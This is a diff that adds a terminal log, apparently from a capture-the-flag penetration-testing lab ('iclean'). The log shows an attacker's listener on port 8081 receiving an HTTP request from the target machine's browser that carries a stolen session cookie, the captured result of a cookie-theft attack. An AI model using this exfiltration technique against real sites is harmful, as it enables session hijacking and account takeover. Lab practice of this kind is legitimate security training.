@@ -1,0 +1,13 @@
+┌──(antonio㉿kali)-[~/all/pentesting/iclean/scripts]
+└─$ bash listen_on_port.bash 8081
+listening on [any] 8081 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.10.11.12] 44896
+GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkwcjg.ntKJ4zBLCtRSaeea-V5fijKrS_Q HTTP/1.1
+Host: 10.10.14.35:8081
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: */*
+Origin: http://127.0.0.1:3000
+Referer: http://127.0.0.1:3000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
